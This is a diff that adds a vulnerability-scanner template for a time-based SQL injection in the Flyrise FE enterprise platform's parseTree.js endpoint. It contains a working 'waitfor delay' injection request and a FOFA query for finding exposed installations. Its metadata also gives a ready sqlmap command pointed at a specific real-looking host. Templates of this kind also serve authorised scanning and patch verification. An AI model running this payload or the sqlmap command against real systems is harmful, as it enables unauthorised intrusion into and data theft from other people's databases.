@@ -1,0 +1,31 @@
+id: flyrise-parseTree-sqli
+
+info:
+  name: 飞企互联 FE 企业运营管理平台 parseTree.js - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+    sqlmap: sqlmap -u "https://oa.ronghuai.cn/common/parseTree.js%70?code=1" -p "code" --batch --random-agent  --tamper=space2comment --risk 3 --dbms="Microsoft SQL Server"
+  tags: flyrise,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
